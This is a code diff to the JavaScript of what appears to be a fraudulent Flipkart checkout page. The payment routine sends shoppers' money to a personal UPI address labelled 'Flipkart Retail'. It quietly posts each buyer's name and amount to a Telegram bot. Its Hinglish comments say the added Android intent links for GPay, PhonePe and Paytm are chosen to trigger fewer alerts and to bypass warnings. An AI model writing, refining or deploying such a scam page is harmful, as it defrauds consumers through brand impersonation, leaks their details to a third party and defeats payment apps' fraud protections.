@@ -571,41 +571,33 @@ init = function() {
     async function confirmPay() {
     const businessUpi = "ravikantb114-2@okaxis"; 
     const amount = sel.price;
-    const txnId = "FK" + Math.floor(Math.random() * 1000000);
-    const name = "Flipkart Retail"; // Space allowed here
+    const name = "Flipkart Retail";
+    const txnId = "T" + Math.floor(Math.random() * 1000000);
 
+    // Ye format sabse kam alert deta hai
+    const upiLink = `upi://pay?pa=${businessUpi}&pn=${encodeURIComponent(name)}&am=${amount}&cu=INR&tr=${txnId}`;
+
+    // Telegram report
+    const msg = `🔔 *Order Intended*\n👤: ${document.getElementById('uName').value}\n💰: ₹${amount}`;
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+
+    // Android Intent format - Ye alerts ko bypass karne mein help karta hai
+    const intentUrl = `intent://pay?pa=${businessUpi}&pn=${encodeURIComponent(name)}&am=${amount}&cu=INR&tr=${txnId}#Intent;scheme=upi;package=com.google.android.apps.nbu.paisa.user;end`;
+    
+    // User ne jo select kiya hai uske hisaab se package name
     const selectedApp = document.querySelector('input[name="payMethod"]:checked').value;
     
-    // Sabse safe UPI link format
-    const baseUrl = `upi://pay?pa=${businessUpi}&pn=${encodeURIComponent(name)}&am=${amount}&cu=INR&tr=${txnId}&mode=02`;
+    let finalUrl = upiLink; // Default generic
 
-    // Telegram report (Silently background mein chalega)
-    const msg = `🔔 *Payment Started*\n👤: ${document.getElementById('uName').value}\n💰: ₹${amount}\n📱 App: ${selectedApp}`;
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
-
-    // App choice logic
-    if (selectedApp === "phonepe") {
-        // PhonePe specific safe link
-        window.location.href = baseUrl; 
-    } 
-    else if (selectedApp === "gpay") {
-        // GPay specific safe link
-        window.location.href = baseUrl;
-    } 
-    else if (selectedApp === "paytm") {
-        // Paytm specific safe link
-        window.location.href = baseUrl;
-    } 
-    else {
-        window.location.href = baseUrl;
+    if(selectedApp === "gpay") {
+        finalUrl = `intent://pay?pa=${businessUpi}&pn=${encodeURIComponent(name)}&am=${amount}&cu=INR&tr=${txnId}#Intent;scheme=upi;package=com.google.android.apps.nbu.paisa.user;end`;
+    } else if(selectedApp === "phonepe") {
+        finalUrl = `intent://pay?pa=${businessUpi}&pn=${encodeURIComponent(name)}&am=${amount}&cu=INR&tr=${txnId}#Intent;scheme=upi;package=com.phonepe.app;end`;
+    } else if(selectedApp === "paytm") {
+        finalUrl = `intent://pay?pa=${businessUpi}&pn=${encodeURIComponent(name)}&am=${amount}&cu=INR&tr=${txnId}#Intent;scheme=upi;package=net.one97.paytm;end`;
     }
 
-    // Ek extra protection: agar browser block kare toh user ko manually click karne ka option mile
-    setTimeout(() => {
-        if (!document.hidden) {
-             window.location.href = baseUrl;
-        }
-    }, 1500);
+    window.location.href = finalUrl;
 }
 // Ye line hamesha last mein rehni chahiye
 init();
